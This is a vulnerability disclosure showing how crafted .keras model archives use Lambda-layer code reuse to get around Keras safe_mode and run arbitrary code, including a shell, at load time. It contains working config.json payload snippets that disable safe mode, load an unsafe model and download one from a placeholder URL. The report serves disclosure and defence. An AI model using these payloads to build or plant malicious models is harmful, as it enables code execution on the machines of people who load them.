## Summary
The Keras `Model.load_model` method can be exploited to achieve arbitrary code execution, even with `safe_mode=True` and after the hardening introduced following my previous CVE (CVE-2025-1550). An attacker can achieve arbitrary code execution by convincing a user to load a specially crafted `.keras` model archive through **code reuse**.

## Details
The vulnerability affects the Keras model format `.keras`, which is used to store and load Keras models. The vulnerability allows an attacker to create a malicious `.keras` model that, when loaded, executes arbitrary code on the victim's machine. In the simplest case, a victim can be compromised simply by executing `keras.saving.load_model("model.keras")` with a malicious model. The attack works regardless of the parameter passed to `load_model`.

In particular, `keras.saving.load_model` includes a parameter `safe_mode`, which is set to `True` by default. The official Keras documentation describes `safe_mode` as:

```
safe_mode: Boolean, whether to disallow unsafe lambda deserialization. When safe_mode=False, loading an object has the potential to trigger arbitrary code execution. This argument is only applicable to the Keras v3 model format. Defaults to True.
```

The proposed attack can be seen as a bypass of the security measures introduced in Keras 3.9 and relies on **code reuse**.

The assumptions are the same: a victim loads a compromised model, even in the "most secure" Keras settings (e.g., `safe_mode=True`). Moreover, the attack does not rely on custom object definitions, meaning it requires no assistance from the victim or additional assumptions.

Despite the specific exploit presented, the core here is that an attacker can use code reuse to perform unintended operations during model loading, in all scenarios involving the `.keras` file format, regardless of how `load_model` is called. 



## Exploit

The `.keras` model format is essentially a ZIP archive containing three files: `config.json`, `metadata.json`, and `model.weights.h5`.

The [Keras documentation](https://keras.io/guides/serialization_and_saving/) describes these files as follows:

```
- A JSON-based configuration file (config.json): Records the configuration of the model, layers, and other trackables.
- A H5-based state file, such as model.weights.h5 (for the whole model), with directory keys for layers and their weights.
- A metadata file in JSON, storing information such as the current Keras version.
```

The exploit uses **Lambda layers** to reuse code from Keras internals. Code reuse is necessary to bypass the new security measures introduced in Keras 3.9.
Specifically, my exploit proceeds in two (optionally three) steps:

1. **Disable Safe Mode** by setting the `safe_mode_saving` attribute to `False`.
2. **Load a new model** in insecure settings, leading to arbitrary code execution.
3. *(Optional)* **Download a model file from the Internet** using Keras utilities (inspired by [this blog post](https://jfrog.com/blog/keras-safe_mode-bypass-vulnerability/) by Andrey Polkovnichenko, JFrog Security Researcher)

The last step is not strictly necessary for the exploit to work, but it makes the exploit more flexible and powerful. Alternatives include using a file shipped with the original model, a file already present on the system, a model from the `hf://` scheme (assuming a compromised model is available on Hugging Face), and so on.

**Note**: This exploit is only an example. The core point of the report is that an attacker can use code reuse to perform unintended operations during model loading, including, for instance, spawning a shell.


**Step 1: Disabling safe mode**

The first observation to do is that simply passing `safe_mode=False` to `load_model` is **not sufficient**, as Keras prioritizes its global state. Specifically, in `keras/src/saving/serialization_lib.py`, the following code is executed:

```python
safe_scope_arg = in_safe_mode()  # Enforces SafeModeScope
safe_mode = safe_scope_arg if safe_scope_arg is not None else safe_mode
```

Since the code we are executing runs in the context of another `load_model` call that we cannot control, to disable safe mode effectively, we must **modify the global state**.

We achieve this by invoking `keras.src.backend.common.global_state.set_global_attribute`, setting `safe_mode_saving` to `False`.
Hereâ€™s a snippet of the `config.json` layer achieving this:

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "set_global_state",
    "function": {
      "module": "keras.src.backend.common.global_state",
      "class_name": "function",
      "config": "set_global_attribute",
      "registered_name": "function"
    },
    "arguments": {
      "value": false
    }
  },
  "name": "set_global_state",
  "inbound_nodes": [
    {
      "args": [],
      "kwargs": {
        "inputs": "safe_mode_saving"
      }
    }
  ]
}
```
Inside the `function` key, the `config` field specifies the name of the function within the module (defined by the `module` entry) to call.
To better understand this JSON snippet and how the arguments are passed, let's look at `keras/src/layers/core/lambda_layer.py`, where the `call` method processes function arguments and passes them to the target function.

```python
def call(self, inputs, mask=None, training=None):
    kwargs = {k: v for k, v in self.arguments.items()}
    if self._fn_expects_mask_arg:
        kwargs["mask"] = mask
    if self._fn_expects_training_arg:
        kwargs["training"] = training
    return self.function(inputs, **kwargs)
```

The `kwargs` correspond to the `arguments` key in the `config.json`. The `inputs` parameter is passed when the layer is called and corresponds to the `inbound_nodes` key. I used the `kwargs` entry of `inbound_nodes` to pass the `inputs`, since the `args` type is restricted. The final call to the function is:

```python
set_global_attribute("safe_mode_saving", value=False)
```

**Step 2: Loading the model with safe mode disabled**

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "unsafe_deserialization",
    "function": {
      "module": "keras.models",
      "class_name": "function",
      "config": "load_model",
      "registered_name": "function"
    },
    "arguments": {
      "safe_mode": false
    }
  },
  "build_config": {
    "input_shape": [null, 10]
  },
  "name": "unsafe_deserialization",
  "inbound_nodes": [
    {
      "args": [],
      "kwargs": {
        "inputs": "/tmp/provola/model.keras"
      }
    }
  ]
}
```

Together with the previous step, this bypasses the security checks imposed by safe mode. The `inputs` parameter represents the path of the model to be loaded. In code, the call appears as follows:

```python
load_model("/tmp/provola/model.keras", safe_mode=False)
```

**Bonus Step: Downloading a model from the Internet**

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "download_file",
    "function": {
      "module": "keras.utils",
      "class_name": "function",
      "config": "get_file",
      "registered_name": "function"
    },
    "arguments": {
      "origin": "https://some-url.com/file",
      "cache_subdir": "/tmp/provola"
    }
  },
  "build_config": {
    "input_shape": [null, 10]
  },
  "name": "download_file",
  "inbound_nodes": [
    {
      "args": [],
      "kwargs": {
        "inputs": "model.keras"
      }
    }
  ]
}
```

Here, `keras.utils.get_file` downloads a file from the internet. The final call is:

```python
get_file("model.keras", origin="https://some-url.com/file", cache_dir="/tmp/provola")
```

The `cache_subdir` specifies the download directory, and `origin` is the URL. `inputs` here represents the `fname` (filename) of the file to be downloaded.

This bonus step is inspired by [this blog post](https://jfrog.com/blog/keras-safe_mode-bypass-vulnerability/) by Andrey Polkovnichenko, JFrog Security Researcher.


### Proof of Concept (PoC)
The complete PoC is available.

The PoC consists of a `poc.keras` file containing the malicious model. This file includes steps 1 and 2 analyzed so far, but it unsafely loads a local model (`model.keras`) instead of downloading one from the internet, as I did not want to host a malicious file. The local model `model.keras` can be generated using `generate_model_keras.py`.

For demonstration purposes, a complete PoC, including code to download the file, is available in `complete_poc.keras`, but it uses a fake URL, which will raise an exception because it is not reachable. 

All PoC variants execute `/bin/sh` for demonstration purposes.

## Attack scenario

The attacker is someone who can create a `.keras` model that is then loaded by the victim. They might, for example, upload a model on platforms like Hugging Face or similar services. The victim is only required to load the malicious model, even with `safe_mode=True` or any other parameter. No further operations are needed, and there is no need to call the model,  making it more complex for the victim to be aware of the threat. **The attack occurs during the parsing of the model.**

The attacker gains untrusted and arbitrary code execution on the victim's machine with the same permissions as the Keras application. The PoC demonstrates how it is possible to spawn a shell by calling `/bin/sh`, but any other command can also be executed.